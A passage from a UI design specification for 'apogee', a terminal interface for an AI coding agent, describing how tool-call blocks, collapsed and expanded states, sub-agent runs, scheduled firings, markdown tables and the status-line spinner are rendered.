**It re-wraps once, and only on a deliberate change.** The key is read from `config.yaml` at
start-up like the rest of the `ui:` block, and `/settings` applies an edit to the *running* session
(ADR 0037): the bar's column is transcript width, so flipping the key lays the frame out again and
the visible transcript re-wraps there and then. What the rule rules out is a re-wrap nobody asked
for — the width never moves because a bar appeared or vanished on its own.

**The terminal's own scroll bar is a different bar, and apogee puts it out.** Every frame apogee
draws lives on the alternate screen, so nothing it renders ever reaches the terminal's scrollback —
but that alone does not settle the terminal's scroll bar. macOS Terminal.app copies the primary
screen into its scrollback at the moment a program switches to the alternate one, and its scroll
bar then stays lit for the whole run, alongside apogee's own. So apogee claims the alternate screen
itself, before the renderer starts, and erases the terminal's saved lines in the same write — the
switch first, the erase second, because an erase sent first only clears a scrollback the switch
immediately refills. **This is why the shell scrollback from before the launch does not survive
apogee starting**: there is no sequence that puts the terminal's bar out and leaves the saved lines
in place, and a frame sharing the screen with a scroll bar it does not control is the thing this
trade buys off. What apogee claims it gives back — the primary screen is restored on the way out,
so the shell returns to the screen it had.

---

## The rules behind the tool-call sketch

**A tool block's shape is specced in [`docs/layout/tool-layout.md`](docs/layout/tool-layout.md),
and that file is canon.** It draws every row of one — the target on the left, the dotted leader, the
outcome slot flush against the row's right edge, the state indicator past it — and it rules on
everything that follows from that shape: what a run of same-label calls folds into, what a
mixed-type **super-group** (`✦ Tools (N calls)`) folds into, the two fold states a call has and the
`see less…` footer that closes an open one, what a click and the keyboard block cursor reach, the
order things give way in when a row runs out of room, and the per-tool table of labels, collapsed
detail, outcome stat and expanded rows. Where that file and this one disagree about a tool block,
**that file wins**. What stays here is the grammar every block obeys, tool or not: the row budget,
the colour roles, how a path is spelled, what a body may say, and the blank line between blocks.

**The label.** A tool header is `✦ ` plus the tool's label, plus — on a grouped block — the member
count `(N)`, **and nothing else — never a target**. That holds for every block alike: a grouped
run, a lone call, a call still in flight, and the stray-result `result` header. The target always
leads the first branch line instead, so the block reshapes around its targets rather than under
them. The label carries no brackets and is rendered **bold in the scheme's `tool-header` role**
(`#E0D090` under `dark`) — a role of its own rather than the `code` role inline code and fenced
blocks carry, so the blocks apogee *ran* read apart from the code it *prints*, and either tone can
be retuned without dragging the other along. The styling is uniform too: a known friendly label
("Read"), an unknown tool's raw name, and `result` all look the same. The
bare-name-means-unregistered signal was the brackets' job and dies with them. The count is **not**
part of the name and is painted in the faint indicator tone rather than the gold: it is the
block's own arithmetic, and a reader scanning the gold down the left edge should not read a
number as part of a tool's name.

**The outcome, in two halves.** What a finished call has to say is split in two, and everything
below follows from that split — never from counting lines. The **summary** is the single line the
row carries in its outcome slot: a read's `154 lines`, a diff's `+2 -2`, a red `error: …`. The
**body** is what hangs beneath it: a command's output, a diff's own lines, an edit's changed lines,
a write's written ones.
A call may have either,
both, or — while it is still in flight — neither. Anything that fits on one line is a summary,
whatever produced it: a command whose whole output is one line rides the row like a read's stat
does (`┕ git rev-parse --short HEAD ⋯⋯⋯ 9f2c1ab`), subject to the canon spec's promote-guard, and
only output that needs a second line becomes a body — the thing the `+N more lines` remainder
counts.

**An edit shows the lines it changes, a write the lines it writes, and the block derives them
itself.** What each of them puts in its body is the canon spec's per-tool table; what is this
document's is where those lines come from. They
are read off the **call's own arguments** at presentation time, never off its result: the tool
reports nothing new, no result grows, nothing extra crosses the wire, and the model's own view of
the call is byte for byte what it always was. The body is therefore there before the result lands;
it is quoted text like every other body, so it is never respelled; and the collapse hides it exactly
as it hides every other body, a click showing the rest. A call whose arguments say nothing about a
change — absent, malformed, or of the wrong shape, and an empty write, which puts no line anywhere
— carries no body at all and renders as it always did.

**Paths print relative to the workspace.** The paths a block **names** are spelled relative to the
workspace root: the target leading a branch (`┕ docs/plan.md ⋯⋯⋯ 154 lines`, never
`┕ /home/me/proj/docs/plan.md ⋯⋯⋯ 154 lines`) and the summary beside it when that summary is the block's
own wording. There is no leading `./` and no leading separator, and the workspace root itself reads
`.` — the ordinary spelling of "here", which is what `pwd` therefore shows. Two things keep their
absolute form on purpose. A path **outside** the workspace stays absolute, because it genuinely is
elsewhere and a relative spelling would say it was not — which matters most on exactly the line it
is most dangerous to misread, the write outside the project a human is deciding about. And a path
that arrived relative is already in this form, so it is passed through untouched. The shortening is
**presentation only**: the arguments the model sent and the output the tool returned are never
rewritten, so the agent's view of a path and the transcript's differ in spelling and in nothing
else. It is applied to the workspace root's own spelling wherever such a line mentions it, so a
line that merely contains a slash — a URL, a fraction, a regex — is not a path and is left alone,
and a sibling directory whose name only opens with the root's spelling (`/home/me/proj-old`) stays
whole. The **status line** is worded from that same view and takes the verb alone — the target it
would have named is already on the block a row beneath it, and the room that path was costing goes
to the context gauge. A **collapsed sub-agent run's summary** names no target either (below), so no
path rides it.

**A body is quoted, never respelled — and so is a promoted line.** The rule above reaches the paths
a block *names* and stops there. The **body** beneath the branch is text the block *quotes* — a
diff's hunk lines, an edit's replacement string, a command's output, an unregistered tool's
argument values — and it prints exactly as the tool wrote it, absolute paths included. A
**summary that was promoted rather than worded** is quoted in the very same sense: a command whose
whole output is a single line puts that line in the row's outcome slot
(`┕ cat paths.txt ⋯⋯⋯ /home/me/proj/docs/plan.md`), and promotion changes where the text sits, never
whose text it is — one row lower the identical line would have been a body. The answer to an
`Ask User` question rides the row on the same footing: it is the human's own words, not a report
the block wrote, so it prints exactly as they typed it. Only its **first line** rides there, and
what hangs beneath an answered question is the **record of the exchange** the popup showed and then
took away: every line of the question as it was put, then one line per offered choice behind `[x]`
where the answer named that choice and `[ ]` where it did not — the same ASCII pair the popup ticks
with, box-drawing checkboxes rendering as tofu — and then any answer line no choice accounts for,
which is where a typed reply lands and where the later lines of a multi-line answer land with it, so
no part of what a human said goes unshown. A question that offered no choices keeps this record all
the same, minus the list: its question lines hang beneath as any other's do, and the last group
starts one line later, at the answer's **second** line — the first is the branch directly above with
no list in between, and recording it would open the body by repeating the row over it. Where choices
were offered that line is kept: unticked boxes say only that the human took none of them, and the
line beneath says what they said instead. Every line of that body is quoted in this same sense, the
choice labels included. It is built from the **call's own arguments** and the answer already
returned, so nothing crosses the wire for it and the model's view of the exchange is byte for byte
what it was; and it exists **only once the answer has landed** — while the question is on the screen
the popup is its live view and the block is the summary-only card any in-flight call is. An
in-workspace path sitting inside file content is content, not a mention: shortened, it would show
the human approving a write a spelling the file will not actually contain. Nothing
decides this by looking at a line, because a content line can look exactly like a path; a line is
respelled only where the presenter that put it there says it is the block's own words — a path it
names, or a summary it wrote itself (`154 lines`, `replaced text in docs/plan.md`, `(no output)`).

**What stays standalone.** A call is groupable when it has a **target** and its presenter did not
mark it **solo** — nothing else, and in particular nothing about what it is carrying. A call with no
target has nothing to lead a row with, since there the detail lines *are* the branches, so it keeps
its own block. And a presenter may state outright that its record must never be an ordinary row in
a list: the answered `Ask User` block, which is the permanent record of an exchange and reads as a
card, and the `Sub-Agent` call, which heads a whole delegation and, per the canon spec, groups with
other sub-agent calls alone rather than joining a super-group. That flag is the one deliberate
never-group switch — it replaces an older rule that kept those two out by accident, through the
bodies they happen to carry, and so also covers the sub-agent head that got no span at all because
the delegation was refused at the depth bound. A Firing is not this session's tool call and never
joins a run either (*The firing block*, below).

**A call with no target** is the one shape the canon spec does not draw, for want of a target to
draw it around: the header stands alone and the lines are themselves the `┝`/`┕` branches, the
summary closing the list since it has no row of its own to ride (an unregistered tool's labelled
arguments, then the `error: …` it earned; a stray `result`). Collapsed, that branch list is what the
cap falls on — the block has no body to cap instead — and the remainder marker hangs beneath it at
the branch marker's own width.

**What the block's own chrome is painted in.** The `│` gutter an expanded member's continuation
rows carry takes the detail gray and deliberately **not** the sub-agent rail's `tool-header` gold,
so an open member inside a nested run cannot be read as a frame of the run. The dotted leader takes
the `tool-leader` role — `muted` damped a step further, so the dots recede behind the two things
they join. And the `see less…` an open block closes on is the prompt block's own word for the same
act: one vocabulary for "close this".

**A change is coloured the one way wherever a block shows one.** Every body that carries a change
paints its `+ ` lines in `diff-add` and its `- ` lines in `diff-del`, context plain, whether the
lines came from a diff's own hunks, an edit's replacements or a write's written content — one
reading for "added" and one for "removed", so a reader never learns the pair twice.

**Blank lines.** Exactly one empty line between blocks, never more. Assistant text is trimmed
of its leading and trailing blank lines, and interior runs of two or more blank lines collapse
to one — except inside a fenced code block, where blank lines are code and stay verbatim.

Inside a sub-agent run that separating row is not empty: it carries the `│` rail gutter, drawn as
deep as *both* neighbouring blocks reach, so the run's frame runs unbroken from its `┌─┶` header
row to its last line. It is still exactly one row, and where the walk climbs out of an expanded
`✦ Sub-Agent (N)` member's span *into the next row of that list* it is the `┊` closing that span —
railed at the level the list resumes at, and standing *in* the separator's place rather than beside
it, since a blank row next to it would say the run ended twice. That is the closer's only
occasion (`docs/layout/tool-layout.md`, "Grouped Sub-agents"): a group's last member, a lone
delegation and a run still streaming at the foot of the transcript are each followed by the
ordinary separator. It is bare only where the two blocks share
no rail — at a run's start, and between two sub-agent calls that follow one another, which is what
keeps them from reading as one run.

---

## Collapsed and expanded blocks

**Two states, and the block is the unit — except in a group, where the member is.** Every block is
either **collapsed** or **expanded**. Collapsed is the compact shape; expanded shows everything the
entry kept, uncapped, and the remainder markers exist only in the collapsed paint. Which rows a
tool block's two states paint, and what a click or the block cursor reaches in either, is the canon
spec's — [`docs/layout/tool-layout.md`](docs/layout/tool-layout.md), "Fold states and interaction".
A **grouped** block is the one place the unit is smaller than the block: it has no state of its own,
each member carries its own, and one member of ten opens while the other nine hold still. The
sub-agent run is the one block whose collapsed paint goes further, eliding its report body along
with the whole span behind it (below). Truncation is thereby a **render-time act on retained
facts**: the entry keeps every line, and the cap applies at paint, not at build.

**One budget, and every tool-shaped block spends it: the header, and at most two content rows.**
So a collapsed block stands no taller than three screen rows, whatever tool filled it and however
long its target is — which is the point, because a scrollback of tool calls should read as a list
and not as a wall. Where the two rows go is the only thing the shape decides:

- **A call with a target** spends **one** of them on its row, and only that one — the leader shape
  fills the width exactly and cuts the target to make it, and the `+N more lines` count of what it
  is hiding rides that row's own outcome slot (below) rather than a row beneath it. **No line of
  the body is shown collapsed.** One preview line out of a hundred said very little and cost every
  block in the scrollback a row; the count says the body **whole** — five hidden lines over a
  five-line output — in cells the row had spare.
- **A call with no target** has no body to hide, so the cap falls on its branch list instead: the
  first **two** branch lines, each clipped to a single row. It counts what it cut nowhere, having no
  outcome slot for a count to ride; its `▶` is what says there is more behind it. Clipping each line
  is what holds this shape to the budget at all — unclipped, one MCP call's argument blob soft-wraps
  a block as tall as the terminal is narrow.
- **A member of a group** gets **one** row and no marker, because a list's rows are one line each
  and what a member hides is reached by opening that member.

A diff is no exception and has none — its `+2 -2` in the outcome slot already says how big the
change is, so the hunks are worth a click rather than twenty permanent rows.

Whether a block hides anything is measured **at paint time, against the width being painted** — the
same render-time act on retained facts every truncation here is — so a block that hides nothing at
200 columns hides a clipped tail at 60, and narrowing the window alone can grow an indicator with
nothing about the entry changing. A **clipped target on its own** is enough: a bodiless call whose
path the row cut has a second state worth showing, and it is a click target and wears an indicator
exactly as a body-carrying one does.

Hiding a targetless call's branches — an unregistered tool's labelled arguments, a registered call
that arrived without its target, a stray `result` —
costs nothing, because the **approval popup** is the surface a human approves an action on and it shows every
argument at decision time, each one under its own `name:` label (above); the transcript block is the
*record*, and a record may collapse. The two surfaces spell one call ONE way: an unrecognised call's
block labels its arguments exactly as the approval prompt does — one `name:` line per argument in
the order the model wrote them, the value's own real lines two spaces beneath, no braces around the
set and no quoted key names — and the same two exceptions hold, a blob with no names to label shown
as it arrived and a value with no flat shape indented as JSON under its own label. What differs
between the two is how many of those lines each surface seats, not what they say: the prompt shows
them whole because a decision is being made on them, the block collapses them to the one budget
because a record may collapse.

**Collapsed is the default, always** — including a call still in flight, a member of a group and a
sub-agent run still working. Only a click changes a block's state, so nothing ever expands or
collapses by itself: a block opened mid-flight streams its body live and stays open when the result
lands. The state is the view's alone — it is never encoded with the transcript, a resumed session
paints everything collapsed, and `/clear` forgets it with everything else.

**What a click means.** A motionless click — press and release in the same cell — **anywhere on a
block that hides something** toggles it, and the whole block is the surface, exactly as the whole of
a collapsed prompt is: a reader who wants the rest of a command's output puts the pointer on the
output rather than hunting for the one row that happens to be the header. Which element a click
lands on inside a nested block — a member, a type row, the umbrella header — is the canon spec's
deepest-wins rule, and the keyboard reaches those same targets through the block cursor the spec
specs. Every row a block paints means the one thing: the `+N more lines` count rides the leader
row's outcome slot rather than a line of its own, so no row is left whose click could only ever
open. A block that hides
nothing in either state marks no rows, and a click on it keeps its selection meaning — as a click
does everywhere else in the transcript. Any drag is a drag-select wherever it starts, marked rows
included: motion is what arbitrates, exactly as it already separates click-to-position from drag in
the prompt. After a toggle the clicked row
keeps its screen position — content grows or shrinks around it, and the line under the cursor never
moves.

**The block wears its state where the click is.** The `▶`/`▼` pair sits where the canon spec puts it
— at the row's right edge, past the outcome slot — and it is painted in the faint
detail tone rather than the label's `tool-header` gold, so it reads as chrome beside the tool's
name instead of as the last letter of it. Its presence *is* the clickability hint, because the
affordance and the click-target rule are **one predicate**: an indicator appears exactly where a
click toggles something, so a row that hides nothing wears none, and a sub-agent run's head wears
one however short its
own report is. The `+N more lines` count is apogee's own word too and is painted as one — the
`tool-marker` role, a warm orange `#E0B080` under `dark`, no background and no bold weight, the
quieter sibling of the prompt block's `see more` (the `prompt-toggle` role) — so a body line
that happens to open with `+` can never be mistaken for it. It is **no longer a line**: it joins
the outcome slot on the leader row, after the middle dot the typed stats already speak in
(`exit 0 · +3 more lines`), so a collapsed lone call is its header and one row. It is also the
first thing that row gives up — ahead of the dots and the target both — on a width too narrow to
seat it beside a target still worth reading; the `▶` says there is more either way. **The outcome
slot wears that same role**, in both states, with an open block's slot taking the role's brighter
step `tool-marker-bright`: the slot is apogee's reading of what the call came to — `12 lines`,
`exit 0 · 1.2s`, `+8 −3`, a quoted line lifted out of the body — and not a line the tool printed,
so it speaks in apogee's voice like the marker does rather than in the detail gray of the output it
summarises. A failed call's red overrides it and nothing else does; every kind of summary,
promoted and quoted ones included, takes the marker tone. The sketch at the
top of this file shows both states side by side: a collapsed `Terminal` row over its remainder
marker, and a `Diff Preview` and a `Sub-Agent` deliberately drawn open so the shape of a full body
appears too — the command among them, because collapsed it would show nothing of what it holds.

**An open block reads a step brighter.** The plain detail gray a block paints its target and
its body in has two tones, and they are two roles: the dim `muted` (`#8a8a8a` under
`dark`) while the block is collapsed, and `muted-bright` (`#b2b2b2`) once it — or, inside a group,
the member — is open, so what a reader opened stands out from the collapsed blocks around it
without being another colour. The pair is a **step along one ramp**, which is what every scheme has
to preserve rather than the direction of the step: under a light scheme "brighter" is the darker of
the two. It reaches the block's **text**
alone. The chrome keeps one tone in both states — the `▶`/`▼`, the `see less…` marker, an open
member's `│` gutter — because those are apogee's marks on the block rather than what the block has
to say, and brightening them alongside the content would make the affordances shout exactly where
the content was meant to. The outcome slot is off this ramp entirely (above): it walks the
`tool-marker` / `tool-marker-bright` pair, the same one step in the same direction, so an opened
block still lifts as a whole. Diff-coloured lines keep their red and green in both states too: the
colour already says which way a line went, and an emphasis step layered onto it would be a second
thing the same colour means.

**An answered question is an ordinary block, and that is the whole rule.** Once the human has
answered, the `Ask User` block carries the record of the exchange as its body (above), so
everything in this section falls on it with nothing added: its row wears the `▶`/`▼` indicator at
the edge, every row it paints is a toggle target, collapsed it is that one clipped row with the
`+N more lines` remainder in its slot and expanded it paints the whole record. It never folds into a group with
the question before it either — and that is now *said*, by the never-group flag its presenter sets
on the record, rather than falling out of the body it happens to carry. None of that is true while
the question is still on the screen, because the block has no body yet: it groups like any other
call, and unless the width clips its target it hides nothing and is no toggle target. The popup is
the surface a question is answered on, exactly as the approval popup is the surface an action is
approved on; the block is the *record*, and a record may collapse.

**A huge prompt collapses to three rows.** A send whose body soft-wraps to *more than three* rows —
a submitted `❯` prompt and a delivered `⧖` interjection alike, they are one shape — paints three:
the first two whole, the third truncated with the house ellipsis far enough to clear a gap, and
`see more (+N lines)…` right-aligned on that same row, where N is every wrapped row beyond the
three. The marker *rides* a content row rather than taking one of its own, which is what makes the
collapsed shape exactly three rows, and it is painted in its own highlighted style — bold light
gray-blue on the block's own field — so what apogee is saying inside the block never reads as what
the human wrote. It stops **one column short of the block's right edge** rather than running flush
to it: the marker carries a background, and a highlight touching the boundary reads as clipped
text. That column is the block's own field, and it is paid for out of the content the row can hold,
never out of the marker. Expanded, the body paints in full — no content row is ever truncated to
make room — and `see less…` closes the block on a trailing row of its own.

**A skill a send invoked is painted where it stands.** The block carries no tag row naming it: the
`/token` inside the block's own text is painted in the `skill` role, the violet — the same colour the
prompt box gives a token that resolves, drawn on the block's own field (`chrome`) rather than the
input box's interior (`surface`), so the block still reads as one band — and the text of the send *is* the record of what the model was given.
The accent is painted onto the rows the block SHOWS, which makes it fall out of the collapse rather
than argue with it — a token on a row the cap hid simply is not painted, a token straddling a
soft-wrap is accented on every visible row it spans, and a token on the truncated third row is held
inside that row's own content so it can never reach across the gap and recolour the `see more` marker.
A drag-selection drawn over the block wins, as everywhere: selection is painted last.

The trigger is measured **at paint time, against the width being painted** — the same render-time
act on retained facts every truncation here is — so widening the window can open a prompt that was
collapsed and narrowing it can collapse one that was not, with nothing about the entry changing.
**The whole block is the toggle surface**: every row it paints, the marker row and the `see less…`
row included, so a motionless click anywhere in it flips the state in both directions, a drag from
any of those rows is a drag-select like any other, and the clicked row keeps its screen position across
the toggle. Collapsed is the default here too — the prompt just sent as much as every prompt of a
resumed session — and the state is the view's alone, never persisted. The sticky header shows the
block's **rendered state** and special-cases nothing: a collapsed huge prompt sticks as its
three-row shape, a deliberately expanded one sticks expanded, self-inflicted and undone by one
click.

**A sub-agent run collapses to its call block.** The `Sub-Agent` call block is the run's header
block: collapsed, it stands alone and the whole railed span beneath it — every inner block, rail
and all — is elided. **Its target — the text leading its row — is the
delegation's name** when the call gave one, and the delegated task's first line when it did not, so
a fan-out reads as what each child is *for* rather than as several openings of one instruction. The
name is clipped and escape-stripped exactly as a task line is, and an unnamed delegation's header
is unchanged. Its summary is `N tool calls · <used>/<window>`, carried in the row's outcome slot,
and while the run works that is the whole of it: the line does **not** name the call in flight. It
used to — the verb and shortened target of the open call, re-read on every frame — and that one
cell changed several times a second beside two that held still, which made the least durable thing
on the row the loudest one. Nothing it said is lost: every call it named has a block of its own
inside the run, one click away. The single live word the line still adds is **`· delegating`**,
and only while the most recent call open in the span is itself a sub-agent — the child has passed
the work on and has nothing of its own in flight, which is the one live fact its own blocks cannot
stand in for, the nested run they would show being collapsed too. Once the report arrives the slot
carries the **report's first line**, or `· done` where the report was long enough to become a
body. The count is **transitive** — every call in the span counts, whatever its
depth — so one number says how much work happened in there, at every nesting level by the same
rule. The middle cell is the other half of that summary: **how full the delegate's own context
got** (`12k/32k`), spelled in the unit-capped form the status line's gauge spells its window in so
the two readings on screen are read in one language, and placed between the count and the gist so
the gist — the one part with no bound on its length — is what a narrow terminal clips. It appears
**only once a reading exists**: a run whose child has not reported usage yet keeps the count alone
rather than trailing an empty separator, which is the gauge's own rule about a number with no scale
beside it. It **ticks as each of the child's Turns lands** and **freezes on the final reading**, so
a finished run goes on saying what it filled however long the scrollback holds it. And unlike the
count it is **not transitive**: each agent fills a window of its own, so a nested run's reading
rides that nested block and never accrues to the run above it. Its **limit half is the child's own
window** for the same reason: a run routed to the Sub-agent server (ADR 0045) is measured against
**that** server's window, so a 7k fill on an 8k grunt box reads `7k/8k` and not `7k/128k` against a
session window the child never had. A run that reports no window of its own is spelled against the
session's — which is every unrouted delegation, the child inheriting the parent's window verbatim,
and every reading recorded before the child's own travelled with it. A last cell closes the line where
the run went **somewhere else**: with delegations routed to the Sub-agent server (ADR 0045), a run
whose model is not the session's own names that model — `2 tool calls · 12k/32k · Found 4 gaps ·
qwen3-4b`, spelled the way the footer spells a model. It is the rarest cell on the row, present only
while routing is on and the target is bound to another model, which is why it takes the end and the
count and the fill keep the left; a same-model delegation renders exactly the line it always did.
Like the fill it is **frozen** when the reading lands and kept in the session record, so a resumed
session shows the model the run really used rather than the one it reopens on. A collapsed run is thereby the one
block that reads as a single summarised line: its own **report body is elided along with the
span**, because the summary slot already says that report's first line and no block prints the
same text twice in two adjacent rows. It counts no `+N more lines` either — the transitive
count is what says there is work behind the header, and the header is a toggle target however
short the report is, so nothing is unreachable. **A run's live text is inside the run from its
first token**: while the delegate is generating, the streamed preview paints at the depth that
produced it — railed inside the run's own frame when the run is expanded, and elided
with the whole span when it is collapsed, where the blinking head and the status line's
`sub-agent · responding` already say a delegate is talking. A preview at the top level would say
the opposite: that this is the main agent's answer. Expanding the run reveals the report in full
and the inner blocks *in their own states*, each collapsed unless it was itself clicked open: the
cascade is this one rule applied at every depth, not a special case. What expanding does **not**
do is take the header's summary slot back: the open row carries the same `N tool calls · <fill>`
and gist the collapsed row carried, and the report, the prompt and the span come out *beneath* it —
a row that said less once opened than it did shut would punish the click that opened it.

**Concurrent delegates get one run each.** When a reply asks for several delegations at once
they run concurrently (ADR 0039), and the scrollback shows **one run per child, in the order
the calls were made** — the first `sub_agent` call is the first of them — each holding only its own
child's work; adjacent ones fold into the canon spec's `✦ Sub-Agent (N)` list, one row per child,
and opening a row opens that child's span. Nothing about a single run's shape changes: each is the
same collapsed call block
described above, in the same two tempi, under the same cap. What changes is that the grouping can
no longer be read off the nesting depth, because siblings share it: every delegated block belongs
to the run whose `sub_agent` call spawned it, and it is *placed* in that run's stretch of the
scrollback as it arrives, however the children's events interleave on the way in. So each block
counts its **own** tool calls, states its **own** context fill, and ticks with its **own** activity
phrase — which is what makes a fan-out readable at all, since the status line can name only one
delegate at a time. Which one it is naming is no longer left to inference: the slot's phrase belongs
to whichever child emitted the last event, and when that delegation was **given a name** the name
takes the place of the generic word — `repo-scout · reading` rather than
`sub-agent · reading`. A delegation that named nothing, and one whose run block has not
opened yet, both keep the generic word. A child's live text follows its own block by the same rule: the streamed
preview paints inside the run that produced it, elided while that run is collapsed, and two
children talking at once neither share a block nor interleave a word. Expanding, collapsing,
clicking and resuming are unchanged — a per-child block is a tool block like any other, and a
session with one delegate at a time renders exactly as it always has.

**The live star.** While a block still contains an open call — a call whose result has not
landed, or a run whose report has not — its header glyph blinks: `✦` shows for half a second, then
its cell is bare for half a second. The bare phase is a space that holds the star's column, so the
label beside it never shifts. The phase is carried on the spinner's own tick, so the transcript
carries no timer of its own. A selection spanning that header drops when the glyph flips, which is
the keep-if-unchanged rule doing its ordinary job on a line that changed. When the result lands the
glyph settles to `✦` and the block repaints once, final.

**The firing block.** A scheduled Firing wears this same shape and is deliberately not a tool call
of this session's: its header leads with `⟳ Schedule` — the glyph `/sessions` tags a Firing's record
with, so one run reads the same in the chat and in the browser — and the Schedule's name leads the
branch. The block appears when the Firing starts, carrying `firing now` beside that name and the
prompt as its body, and the *same* block is enriched in place when the run returns: it stays where
it was announced rather than moving to where it finished. The payoff is the run's **answer**, split
by the ordinary two-halves rule — an answer that comes to one line fills the row's outcome slot,
quoted; a
longer one leads the body with that slot holding the `+N more lines` alone, so the collapsed block
is the Schedule's name and a count of the answer with everything else behind it, and a
click is what shows the answer itself. Beneath the branch the body carries the
prompt (its first line led by `prompt: `, the one word that tells the two quoted voices apart), one
stats line (`2 turns · 4s`, and a `· N denied` cell only when a gated action was actually refused),
and the record pointer (`saved as "…" — find it in /sessions`), dropped when nothing was persisted.
A failed Firing words its branch `error: …` and shows no answer — a partial answer under an error
reads as a result — while keeping the stats and any salvaged pointer. The `⟳` is **static**: the
spinner belongs to the worker driving this session's Exchange and this session is idle while a
Firing runs, so the header never blinks whatever the frame's phase, and the branch's own word is
what says the run is going. Everything else a Schedule does — created, skipped, stopped — stays a
one-line note: those are lifecycle facts with no body, and a block around them would be an empty
drawer.

---

## Markdown tables in assistant text

**When a table is a table.** A pipe table in an answer renders as a table only once its delimiter
row has landed: a line carrying at least one unescaped `|`, immediately followed by a row built
only from `-`, `:`, spaces and pipes, with at least one `-` per cell and the same cell count as the
line above it. Leading and trailing pipes are optional, `\|` is a literal pipe inside a cell, and
the block ends at the first blank line or the first line with no pipe in it. A delimiter-shaped
line with no header above it is not a table and keeps whatever it renders as today.

**It is ruled, not boxed.** No outer frame and no corners — a table is columns of text separated by
a single **`│` with one space either side** and ruled across by a **`─` under the header and between
every pair of adjacent body rows**, and nothing else, sitting in the same body column the rest of
the answer sits in rather than reading as a boxed object dropped into the transcript. The dividers
and the rules all wear the same muted colour: the frame is not content and must not read as loudly
as the cells it separates. Every cell is padded to the
widest cell in its column. Each cell is
rendered as inline markdown first, so `**bold**` and `` `code` `` inside a cell style the way they
do in a paragraph, and it is that *rendered* width — the painted width, measured by the
width authority like every width in this document — that sets the column, never the source width,
so markup characters and the bytes of a colour escape never push a column open. The **last** column
is padded like every other one, so every line of a table — header, rules and body rows alike — ends
in the same column and the block shows one straight right edge to whatever sits beside it. A row
that stopped at its last word instead would leave a wider gap to the scroll-bar gutter than the
rule above it does, which reads as the bar stepping inward beside the body.

**The header and the rules.** The header row's cells are bold, the same weight `**bold**` earns
anywhere else — and that weight is the only thing setting the header apart, because the line under
it and the lines between the body rows are one and the same stroke. A rule — the delimiter row
renders as the first of them — is a **run of `─` spanning the whole table that crosses every divider
at a `┼`**: the three cells a divider occupies are ruled `─┼─`, so the line reads as one continuous
horizontal rule across the block rather than a dash per column interrupted at every
column division, and each crossing sits in exactly the cell the `│` occupies on the rows above and
below it. Every one of them is exactly one line tall, wears the same muted colour as the dividers,
and — the divider cells being ruled rather than blank — is exactly as wide as every other line of
the block.

**Where the rules go.** One under the header, and one between each pair of **adjacent body rows** —
nowhere else. Never above the first body row, where the header's rule already sits; never below the
last, because there is no bottom frame to close; and never inside a row, because a row whose cell
wraps onto further lines is still one row and its continuation lines stay rule-free, so "more of
this row" never reads as "the next row".

**Alignment is the delimiter row's word.** `:--` left, `--:` right, `:-:` centred, a plain `---`
left; every cell is padded on the side its column names, header cells included. A centred cell with
an odd remainder takes the extra space on its right. A row with fewer cells than the header is
padded out with empty ones and a row with more loses the excess: the column count is the header's
to set.

**The width cap is absolute.** No rendered line ever exceeds the width the block was given, a table
no more than anything else — and it is the **painted** width that is capped, so the cap holds on a
line carrying emoji or CJK on any terminal, not merely in the measure the layout computed with. The
only thing that may cross it is a single grapheme wider than the whole limit, which no break can
divide; it takes a line to itself. Where the natural column widths plus the dividers between them do
not fit, the widest column is shrunk one cell at a time — the leftmost of them where two are equally
wide, so the outcome is the same every repaint — until the table fits, and a cell too wide for the
column it lands in **wraps** inside that column. Nothing is cut: there is no `…` anywhere in the
table contract, and the single indivisible grapheme above is its one exemption. No column is ever
shrunk below **four cells** of content: narrower than that a wrapped cell comes apart into a letter
or two per line, which reads as vertical text with a rule beside it rather than as a column. That
minimum is a floor on the shrink, not a width every column is handed — a column whose content is
naturally narrower keeps its own width and is never charged the four cells it would not have used.
If the width cannot give every column that readable minimum once the dividers between them are paid
for, the block is not drawn as a table at all: it falls back to the plain paragraphs it would have
been before, which is always readable and never overflows.

**One row is as many lines as its tallest cell.** A cell too wide for its column wraps inside it,
and the row becomes as many physical lines as the tallest of its cells needs — undivided by a rule,
which goes between rows and never inside one. Cells are
**top-aligned**: a shorter cell's content sits on the row's first lines and its blank lines fall
below it, never above. The height is **unbounded** and nothing is ever dropped — a cap would only
put the cut back at a different threshold. Every line of the block is still exactly the table's
width, the continuation lines of a wrapped cell and the blank filler beside it included, so the
straight right edge above holds through a wrapped row as it does through the rules.

**A partial table is plain text.** While a table streams in, everything before the delimiter row is
ordinary paragraphs — the contract every other half-typed construct keeps — and the block snaps
into a table on the row that completes it. Columns go on measuring themselves against the rows that
have arrived, so a table may widen a column as it streams; that reflow is expected and costs
nothing but a repaint.

**Before and after.** What the model emits:

```
| Tool | Calls | Notes |
|:--|--:|:-:|
| Read File | 12 | fast |
| Run | 3 | `go test ./...` |
```

and what the transcript draws for it at 34 columns of body width — `Tool` left, `Calls` right,
`Notes` centred, the header bold, `go test ./...` styled as inline code with its backticks gone:

```
Tool      │ Calls │     Notes
──────────┼───────┼──────────────
Read File │    12 │     fast
──────────┼───────┼──────────────
Run       │     3 │ go test ./...
```

Two of those five lines carry trailing blanks out to the rule's last column — the padding of the
centred `Notes` column, which print cannot show. All five are 33 columns wide: the three columns
are 9, 5 and 13 cells wide and each of the two dividers costs three more. The two body rows are
ruled apart by the same stroke that underlines the header, and neither the top nor the bottom of the
block is closed.

---

## The status line's spinner

**Which animation.** The two braille cells opening the running status line above are the `snake`
style, the default: six dots walking the outer ring of the 4×4 dot grid two cells form side by
side, one lap a second. `ui.spinner` in `config.yaml` selects the animation — `snake`, `glitter`
(a pair of cells re-rolled twenty times a second out of the braille block sorted by density,
under a six-second swell to a solid `⣿⣿` and back), or `classic`, the single-cell `⣾⣽⣻⢿⡿⣟⣯⣷`
rotation apogee shipped before and still supports. Only `classic` is one column wide; the other
two are two, which shifts the activity phrase one column right of the sketch's older single-cell
`⣻`. The phrase and the elapsed clock beside it are the same for every style.

**Which colour.** `ui.spinner-color` runs a soft ten-second loop through the active scheme's four
`spinner-*` roles, visited in order and closing back on the first (violet → green → amber → pink
under `dark`), over whichever style is selected; with it off, the glyph keeps the terminal's own
text colour on the status bar's field. Picking another colour scheme moves the loop with it — the
stops are the scheme's, not this file's. The two keys are
independent — every style renders both coloured and plain — so picking `classic` does not turn
the loop off, and `classic` with the loop off is exactly the status line apogee rendered before
the styles existed. The loop is quantised downstream by the terminal, so on a 256-colour
terminal it steps visibly and on a 16-colour one it collapses to a couple of tones; that is what
turning it off is for.

**When the phrase says nothing is happening.** A spinner keeps turning whether or not the engine is
still answering, so a running phrase gains a qualifier once the engine has gone silent: the
